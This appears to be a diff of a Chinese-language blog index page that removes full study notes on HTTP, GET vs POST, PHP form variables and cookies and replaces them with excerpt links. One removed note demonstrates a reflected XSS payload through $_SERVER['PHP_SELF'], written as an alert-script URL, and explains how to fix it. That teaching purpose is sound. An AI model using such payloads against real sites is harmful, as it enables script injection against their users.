-<p>客户端请求：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /hello.txt HTTP/<span class="number">1.1</span></span><br><span class="line">User-Agent: curl/<span class="number">7.16</span><span class="number">.3</span> libcurl/<span class="number">7.16</span><span class="number">.3</span> OpenSSL/<span class="number">0.9</span><span class="number">.7</span>l zlib/<span class="number">1.2</span><span class="number">.3</span></span><br><span class="line">Host: www.example.com</span><br><span class="line">Accept-Language: en, mi</span><br></pre></td></tr></table></figure></p>
-<p>服务端响应：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Mon, <span class="number">27</span> Jul <span class="number">2009</span> <span class="number">12</span>:<span class="number">28</span>:<span class="number">53</span> GMT</span><br><span class="line">Server: Apache</span><br><span class="line">Last-Modified: Wed, <span class="number">22</span> Jul <span class="number">2009</span> <span class="number">19</span>:<span class="number">15</span>:<span class="number">56</span> GMT</span><br><span class="line">ETag: <span class="string">"34aa387-d-1568eb00"</span></span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: <span class="number">51</span></span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Type: text/plain</span><br></pre></td></tr></table></figure></p>
-<p>输出结果：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello World! My payload includes a trailing CRLF.</span><br></pre></td></tr></table></figure></p>
-<h1 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h1><p><img src="/2019/02/28/HTTP笔记/3.png" alt=""></p>
-<h1 id="GET和POST的差别：-面试题"><a href="#GET和POST的差别：-面试题" class="headerlink" title="GET和POST的差别：(面试题)"></a>GET和POST的差别：(面试题)</h1><p>参考文章:<a href="https://www.cnblogs.com/logsharing/p/8448446.html" target="_blank" rel="noopener">https://www.cnblogs.com/logsharing/p/8448446.html</a><br>我觉得这篇文章写的很好，这两个文章的差别写得一清二楚。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(1)GET在浏览器回退时是无害的，而POST会再次提交请求。</span><br><span class="line"></span><br><span class="line">(2)GET产生的URL地址可以被Bookmark，而POST不可以。</span><br><span class="line"></span><br><span class="line">(3)GET请求会被浏览器主动cache，而POST不会，除非手动设置。</span><br><span class="line"></span><br><span class="line">(4)GET请求只能进行url编码，而POST支持多种编码方式。</span><br><span class="line"></span><br><span class="line">(5)GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。</span><br><span class="line"></span><br><span class="line">(6)GET请求在URL中传送的参数是有长度限制的，而POST么有。</span><br><span class="line"></span><br><span class="line">(7)对参数的数据类型，GET只接受ASCII字符，而POST没有限制。</span><br><span class="line"></span><br><span class="line">(8)GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。</span><br><span class="line"></span><br><span class="line">(9)GET参数通过URL传递，POST放在Request body中。</span><br></pre></td></tr></table></figure>
-<p>(来自w3c的标准答案，记住了)，然后</p>
-<p>实际上，<strong>POST和GET在本质上没有差别</strong></p>
-<p>HTTP是基于TCP/IP的关于数据如何在万维网中如何通信的协议。</p>
-<p>POST和GET是HTTP协议中的两种发送请求的方法.</p>
-<p>HTTP的底层是TCP/IP协议，所以GET和POST的底层也是TCP/IP，也就是说，GET/POST都是TCP链接。<br>GET和POST能做的事情是一样一样的。你要给GET加上request body，给POST带上url参数，技术上是完全行的通的。 </p>
-<p>而出现标准答案里的区别的原因，在那个帖子里，我看到一个很形象的比喻<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在我大万维网世界中，TCP就像汽车，我们用TCP来运输数据，它很可靠，从来不会发生丢件少件的现象。但是如果路上跑的全是看起来一模一样的汽车，那这个世界看起来是一团混乱，送急件的汽车可能被前面满载货物的汽车拦堵在路上，整个交通系统一定会瘫痪。为了避免这种情况发生，交通规则HTTP诞生了。HTTP给汽车运输设定了好几个服务类别，有GET, POST, PUT, DELETE等等，HTTP规定，当执行GET请求的时候，要给汽车贴上GET的标签（设置method为GET），而且要求把传送的数据放在车顶上（url中）以方便记录。如果是POST请求，就要在车上贴上POST的标签，并把货物放在车厢里。当然，你也可以在GET的时候往车厢内偷偷藏点货物，但是这是很不光彩；也可以在POST的时候在车顶上也放一些数据，让人觉得傻乎乎的。HTTP只是个行为准则，而TCP才是GET和POST怎么实现的基本。</span><br></pre></td></tr></table></figure></p>
-<p>但是，我们只看到HTTP对GET和POST参数的传送渠道（url还是requrest body）提出了要求。“标准答案”里关于参数大小的限制又是从哪来的呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在我大万维网世界中，还有另一个重要的角色：运输公司。不同的浏览器（发起http请求）和服务器（接受http请求）就是不同的运输公司。 虽然理论上，你可以在车顶上无限的堆货物（url中无限加参数）。但是运输公司可不傻，装货和卸货也是有很大成本的，他们会限制单次运输量来控制风险，数据量太大对浏览器和服务器都是很大负担。业界不成文的规定是，（大多数）浏览器通常都会限制url长度在2K个字节，而（大多数）服务器最多处理64K大小的url。超过的部分，恕不处理。如果你用GET服务，在request body偷偷藏了数据，不同服务器的处理方式也是不同的，有些服务器会帮你卸货，读出数据，有些服务器直接忽略，所以，虽然GET可以带request body，也不能保证一定能被接收到哦。</span><br></pre></td></tr></table></figure></p>
-<p>总结：GET和POST本质上就是TCP链接，并无差别。但是由于HTTP的规定和浏览器/服务器的限制，导致他们在应用过程中体现出一些不同。</p>
-<h2 id="然而，POST和GET有一个巨大的区别："><a href="#然而，POST和GET有一个巨大的区别：" class="headerlink" title="然而，POST和GET有一个巨大的区别："></a>然而，POST和GET有一个巨大的区别：</h2><p><strong>GET产生一个TCP数据包；POST产生两个TCP数据包。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">长的说：</span><br><span class="line"></span><br><span class="line">对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；</span><br><span class="line"></span><br><span class="line">而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。</span><br><span class="line"></span><br><span class="line">也就是说，GET只需要汽车跑一趟就把货送到了，而POST得跑两趟，第一趟，先去和服务器打个招呼“嗨，我等下要送一批货来，你们打开门迎接我”，然后再回头把货送过去。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">因为POST需要两步，时间上消耗的要多一点，看起来GET比POST更有效。因此Yahoo团队有推荐用GET替换POST来优化网站性能。但这是一个坑！跳入需谨慎。为什么？</span><br><span class="line"></span><br><span class="line">1. GET与POST都有自己的语义，不能随便混用。</span><br><span class="line"></span><br><span class="line">2. 据研究，在网络环境好的情况下，发一次包的时间和发两次包的时间差别基本可以无视。而在网络环境差的情况下，两次包的TCP在验证数据包完整性上，有非常大的优点。</span><br><span class="line"></span><br><span class="line">3. 并不是所有浏览器都会在POST中发送两次包，Firefox就只发送一次。</span><br></pre></td></tr></table></figure></p>
-<h2 id="现在，当面试官再问你“GET与POST的区别”的时候，你的内心是不是这样的？"><a href="#现在，当面试官再问你“GET与POST的区别”的时候，你的内心是不是这样的？" class="headerlink" title="现在，当面试官再问你“GET与POST的区别”的时候，你的内心是不是这样的？"></a>现在，当面试官再问你“GET与POST的区别”的时候，你的内心是不是这样的？</h2><p><img src="/2019/02/28/HTTP笔记/4.png" alt=""></p>
-<h1 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h1><p><img src="/2019/02/28/HTTP笔记/5.png" alt=""><br><img src="/2019/02/28/HTTP笔记/6.png" alt=""><br><img src="/2019/02/28/HTTP笔记/7.png" alt=""><br><img src="/2019/02/28/HTTP笔记/8.png" alt=""><br><img src="/2019/02/28/HTTP笔记/9.png" alt=""></p>
-<h1 id="HTTP常见首部字段"><a href="#HTTP常见首部字段" class="headerlink" title="HTTP常见首部字段"></a>HTTP常见首部字段</h1><p><img src="/2019/02/28/HTTP笔记/10.png" alt=""></p>
-
+            <p>
+              
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/02/28/HTTP笔记/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -1204,7 +1274,7 @@
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cookie">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/name.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
@@ -1290,26 +1360,19 @@
       
         
           
-            <h1 id="PHP-GET-变量"><a href="#PHP-GET-变量" class="headerlink" title="PHP $__GET 变量"></a>PHP $__GET 变量</h1><p>在 PHP 中，预定义的 $__GET 变量用于收集来自 method=”get” 的表单中的值。</p>
-<h2 id="GET-变量"><a href="#GET-变量" class="headerlink" title="$__GET 变量"></a>$__GET 变量</h2><p>预定义的 $__GET 变量用于收集来自 method=”get” 的表单中的值。</p>
-<p>从带有 GET 方法的表单发送的信息，对任何人都是可见的（会显示在浏览器的地址栏），并且对发送信息的量也有限制。</p>
-<p>实例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">"welcome.php"</span> method=<span class="string">"get"</span>&gt;</span><br><span class="line">名字: &lt;input type=<span class="string">"text"</span> name=<span class="string">"fname"</span>&gt;</span><br><span class="line">年龄: &lt;input type=<span class="string">"text"</span> name=<span class="string">"age"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/02/28/PHP中POST-GET/1.png" alt=""><br>然后填入数据跳到<br><img src="/2019/02/28/PHP中POST-GET/2.png" alt=""></p>
-<h2 id="何时使用-method-”get”？"><a href="#何时使用-method-”get”？" class="headerlink" title="何时使用 method=”get”？"></a>何时使用 method=”get”？</h2><p>在 HTML 表单中使用 method=”get” 时，所有的变量名和值都会显示在 URL 中。</p>
-<p>注释：所以在发送密码或其他敏感信息时，不应该使用这个方法！</p>
-<p>然而，正因为变量显示在 URL 中，因此可以在收藏夹中收藏该页面。在某些情况下，这是很有用的。</p>
-<p>注释：HTTP GET 方法不适合大型的变量值。它的值是不能超过 2000 个字符的。</p>
-<h1 id="PHP-POST-变量"><a href="#PHP-POST-变量" class="headerlink" title="PHP $__POST 变量"></a>PHP $__POST 变量</h1><p>预定义的 $__POST 变量用于收集来自 method=”post” 的表单中的值。</p>
-<p>从带有 POST 方法的表单发送的信息，对任何人都是不可见的（不会显示在浏览器的地址栏），并且对发送信息的量也没有限制。</p>
-<p>注释：然而，默认情况下，POST 方法的发送信息的量最大值为 8 MB（可通过设置 php.ini 文件中的 post_max_size 进行更改）。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">"welcome.php"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">名字: &lt;input type=<span class="string">"text"</span> name=<span class="string">"fname"</span>&gt;</span><br><span class="line">年龄: &lt;input type=<span class="string">"text"</span> name=<span class="string">"age"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">welcome <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_POST[<span class="string">"fname"</span>]; <span class="meta">?&gt;</span>!&lt;br&gt;</span><br><span class="line">your age is <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_POST[<span class="string">"age"</span>]; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="何时使用-method-”post”？"><a href="#何时使用-method-”post”？" class="headerlink" title="何时使用 method=”post”？"></a>何时使用 method=”post”？</h2><p>从带有 POST 方法的表单发送的信息，对任何人都是不可见的，并且对发送信息的量也没有限制。</p>
-<p>然而，由于变量不显示在 URL 中，所以无法把页面加入书签。</p>
-<h1 id="PHP-REQUEST-变量"><a href="#PHP-REQUEST-变量" class="headerlink" title="PHP $__REQUEST 变量"></a>PHP $__REQUEST 变量</h1><p>预定义的 $<strong>REQUEST 变量包含了 $</strong>GET、$_POST 和 $__COOKIE 的内容。</p>
-<p>$__REQUEST 变量可用来收集通过 GET 和 POST 方法发送的表单数据。</p>
-<p>将 “welcome.php” 文件修改为如下代码，它可以接受 $_GET、$_POST等数据</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">welcome <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_REQUEST[<span class="string">"fname"</span>]; <span class="meta">?&gt;</span>!&lt;br&gt;</span><br><span class="line">your age is <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_REQUEST[<span class="string">"age"</span>]; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+            <p>
+              
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/02/28/PHP中POST-GET/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -1371,7 +1434,7 @@
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cookie">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/name.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
@@ -1457,29 +1520,19 @@
       
         
           
-            <p>复习PHP表单时，在教程中看到这个问题，然后了解一下。</p>
-<h1 id="介绍一下这个问题"><a href="#介绍一下这个问题" class="headerlink" title="介绍一下这个问题"></a>介绍一下这个问题</h1><p>先来说说这个超级全局变量吧</p>
-<p>其实我觉得这个变量还蛮有意思的。<br>$_SERVER[“PHP_SELF”]是超级全局变量，返回当前正在执行脚本的文件名，与 document root相关。</p>
-<p>所谓 document root 就是apache服务器网页(文档)根目录<br>既然说到这个，那就补充一个知识点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">documentroot 和directory的区别:</span><br><span class="line"></span><br><span class="line">1.DocumentRoot</span><br><span class="line">DocumentRoot指定apache服务器网页(文档)根目录</span><br><span class="line">DocumentRoot &quot;/home/iflow/apache2/htdocs&quot;</span><br><span class="line">它的作用是指定网站文件在服务器存放路径。</span><br><span class="line"></span><br><span class="line">2..Directory</span><br><span class="line">Directory是在只指定目录的情况下默认显示的文件名</span><br><span class="line">Directory home.html index.html index.html.var index.shtml</span><br><span class="line">作用是我打开网站时，输入 域名或者url+目录，如果目录下存在DirectoryIndex设置的文件名的文档，home.html index.html 等，默认就打开这样的文件。没有这些文档的话，打开存在的目录会显示Forbidden错误。</span><br></pre></td></tr></table></figure></p>
-<p>$_SERVER[‘PHP_SELF’]，它的值是“当前php文件相对于网站根目录的位置地址”。</p>
-<p>也就是说，如果在<a href="http://www.xxxx.com/output/html/data.php中" target="_blank" rel="noopener">http://www.xxxx.com/output/html/data.php中</a> 使用$_SERVER[‘PHP_SELF’]</p>
-<p>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_SERVER[<span class="string">'PHP_SELF'</span>]; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>那么返回的内容就是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/output/html/data.php</span><br></pre></td></tr></table></figure></p>
-<p>那也就是说，一般情况下，我们通过什么地址访问某网站，就会返回什么样的document root。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"&lt;?php echo $_SERVER[’PHP_SELF’]; ?&gt;"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"submit"</span>/&gt;</span><br></pre></td></tr></table></figure></p>
-<p>这么一段代码，看着没什么问题,本来看来这段代码其实是挺方便的，对于调用代码。<br>如果我们访问 http://…/test.php/a=1<br>那么我们将得到如下的客户端代码：<br>（假如该代码所在页面是<a href="http://www.shuihan.com/form.php" target="_blank" rel="noopener">http://www.shuihan.com/form.php</a> ）<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"/fwolf/temp/test.php/a=1"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"submit"</span>/&gt; &lt;/form&gt;</span><br></pre></td></tr></table></figure></p>
-<p>那么这时候如果我们使用XSS跨站攻击。<br>我们访问 <a href="http://www.shuihan.com/form.php%22%3E%3Cscript%3Ealert" target="_blank" rel="noopener">http://www.shuihan.com/form.php%22%3E%3Cscript%3Ealert</a>(‘XSS attack!’)%3C/script%3E%3Cbr</p>
-<p>那么实际上客户端代码为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">"post"</span> action=<span class="string">"http://www.shuihan.com/form.php"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(<span class="string">'XSS attack!'</span>)&lt;/script&gt;&lt;br /&gt;&lt;br&gt;&lt;!-- My Form --&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p>
-<p>一次XSS攻击完成。</p>
-<h1 id="如何修复"><a href="#如何修复" class="headerlink" title="如何修复"></a>如何修复</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>$_SERVER[“PHP_SELF”] 可以通过 htmlspecialchars() 函数来避免被利用。</p>
-<p>form 代码如下所示：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">"post"</span> action=<span class="string">"&lt;?php echo htmlspecialchars($_SERVER["</span>PHP_SELF<span class="string">"]);?&gt;"</span>&gt;</span><br></pre></td></tr></table></figure></p>
-<p>htmlspecialchars() 把一些预定义的字符转换为 HTML 实体。现在如果用户想利用 PHP_SELF 变量, 结果将输出如下所示：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">"post"</span> action=<span class="string">"test_form.php/&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert('hacked')&amp;lt;/script&amp;gt;"</span>&gt;</span><br></pre></td></tr></table></figure></p>
-<p>这样即使网址中包含恶意代码，也会被“转换”为用于显示的html代码，而不是被直接嵌入html代码中执行，简单一点说，就是”&lt;”会变成”&lt;”，变成无害的了。 </p>
-<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>用$_SERVER[‘REQUEST_URI’]来替代$_SERVER[‘PHP_SELF’]，在phpinfo()中可以看到这两个变量的区别： </p>
-<p>_SERVER[‘REQUEST_URI’] /fwolf/temp/test.php/%22%3E%3Cscript%3Ealert(’xss’)%3C/script%3E%3Cfoo _SERVER[‘PHP_SELF] /fwolf/temp/test.php/”&gt; </p>
-<p>　　$_SERVER[‘REQUEST_URI’]会原封不动的反映网址本身，网址中如果有%3C，那么你得到的也将会是%3C，而$ _SERVER[‘PHP_SELF’]会对网址进行一次urldecode操作，网址中的%3C将会变成字符”&lt;”，所以就产生了漏洞。需要注意的是，在很多情况下，浏览器会对用户输入要提交给web服务器的内容进行encode，然后服务器端程序会自动进行decode，得到相应的原指，在我们进行post或者get操作的时候都是这样。 </p>
-<p>　　另外还有两点需要指出，第一是这种写法虽然没有直接用到$_SERVER[‘PHP_SELF’]，但实际效果却是一样的，只是发生的时间错后到了用户提交之后的下一个页面，所以，form的action还是不要留空的好。第二点，除了PHP_SELF之外，其他的$_SERVER变量也许也会有类似的漏洞，比如SCRIPT_URI, SCRIPT_URL, QUERY_STRING, PATH_INFO, PATH_TRANSLATED等等，在使用他们之前一定要先作htmlentities之类的</p>
-<h2 id="FILE和-SERVER-“PHP-SELF”-的区别"><a href="#FILE和-SERVER-“PHP-SELF”-的区别" class="headerlink" title="FILE和$_SERVER[“PHP_SELF”]的区别"></a><strong>FILE</strong>和$_SERVER[“PHP_SELF”]的区别</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_FILE_：a文件include b文件，在b文件中echo __FILE__，显示的是b的路径</span><br><span class="line"></span><br><span class="line">$_SERVER[&quot;PHP_SELF&quot;]：a文件include b文件，在b文件中echo $_SERVER[&quot;PHP_SELF&quot;]，显示的是a的路径</span><br><span class="line"></span><br><span class="line">但是如果是a include b,b include c</span><br><span class="line">那么c里面echo $_SERVER[&quot;PHP_SELF&quot;]会返回a的URL,而不会返回b的。</span><br></pre></td></tr></table></figure>
+            <p>
+              
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/02/27/PHP中-PHP-SELE/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -1541,7 +1594,7 @@
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cookie">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/name.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
@@ -1637,36 +1690,19 @@
       
         
           
-            <h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p>Cookie通常也叫做网站cookie,浏览器cookie或者httpcookie,是保存在用户浏览器端的，并在发出http请求时会默认携带的一段文本片段。它可以用来做用户认证，服务器校验等通过文本数据可以处理的问题。那也就是说cookie将会带有用户身份的信息</p>
-<h2 id="HTTP请求-cookie的交互流程"><a href="#HTTP请求-cookie的交互流程" class="headerlink" title="HTTP请求+cookie的交互流程"></a>HTTP请求+cookie的交互流程</h2><p><img src="/2019/02/27/HTTP之COOKIE及SESSION/1.png" alt="1"></p>
-<p>比如第一次登录某网站，我们会发出http请求+用户认证信息。</p>
-<p>服务器将会对该请求进行认证，认证成功后，<strong>对于与该用户认证信息，将生成cookie,并且对浏览器发送http响应，并且在响应头中有Set-Cookie，Set-Cookie响应头是服务器返回的响应头用来在浏览器种cookie，一旦被种下，当浏览器访问符合条件的url地址时，会自动带上这个cookie</strong></p>
-<p>于是我们的浏览器将会提取并存储cookie信息于内存或磁盘中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">可以大致把Cookie分为2类： 回话cookie和持久cookie</span><br><span class="line"></span><br><span class="line">会话cookie: 是一种临时的cookie，它记录了用户访问站点时的设置和偏好，关闭浏览器，会话cookie就被删除了</span><br><span class="line"></span><br><span class="line">持久cookie: 存储在硬盘上，（不管浏览器退出，或者电脑重启，持久cookie都存在）， 持久cookie有过期时间</span><br></pre></td></tr></table></figure></p>
-<p>第二次登录该网站时，浏览器先在电脑里寻找对应该网站的Cookie.txt文件。如果找到，则根据此Cookie.txt产生Cookie报头，放在HTTP请求报文中发给服务器。</p>
-<p>服务器接收到包含Cookie报头的请求，检索其Cookie中与用户有关的信息，生成一个客户端所请示的页面应答传递给客户端。 浏览器的每一次网页请求，都可以传递已存在的Cookie文件，例如，浏览器的打开或刷新网页操作。</p>
-<h2 id="cookie的内容"><a href="#cookie的内容" class="headerlink" title="cookie的内容"></a>cookie的内容</h2><p>主要包括：名字，值，过期时间，路径和域。</p>
-<p>1）Name 和 Value 属性由程序设定,默认值都是空引用。</p>
-<p>2）Domain属性的默认值为当前URL的域名部分，不管发出这个cookie的页面在哪个目录下的。</p>
-<p>3）Path属性的默认值是根目录，即 ”/” ，不管发出这个cookie的页面在哪个目录下的。可以由程序设置为一定的路径来进一步限制此cookie的作用范围。</p>
-<p>4）Expires 属性，这个属性设置此Cookie的过期日期和时间。</p>
-<h3 id="Path和Domian属性"><a href="#Path和Domian属性" class="headerlink" title="Path和Domian属性"></a>Path和Domian属性</h3><p><strong>–path:</strong>　　<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果http://www.china.com/test/index.html 建立了一个cookie，那么在http://www.china.com/test/目录里的所有页面，以及该目录下面任何子目录里</span><br><span class="line">的页面都可以访问这个cookie。这就是说，在http://www.china.com/test/test2/test3 里的任何页面都可以访问http://www.china.com/test/index.html</span><br><span class="line">建立的cookie。</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">但是，如果http://www.china.com/test/ 需要访问http://www.china.com/test/index.html设置的cookes，该怎么办？</span><br><span class="line"></span><br><span class="line">我们要把cookies的path属性设置成</span><br><span class="line">“/”。在指定路径的时候，凡是来自同一服务器，URL里有相同路径的所有WEB页面都可以共享cookies。</span><br></pre></td></tr></table></figure>
-<p><strong>–Domain:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">比如： http://www.baidu.com/xxx/login.aspx 页面中发出一个cookie，Domain属性缺省就是www.baidu.com ，可以由程序设置此属性为需要的值。值是域名，比如www.china.com。这是对path路径属性的一个延伸。如果我们想让 www.china.com能够访问bbs.china.com设置的cookies，该怎么办? 我们可以把domain属性设置成“china.com”， 并把path属性设置成“/”</span><br></pre></td></tr></table></figure></p>
-<p>　　</p>
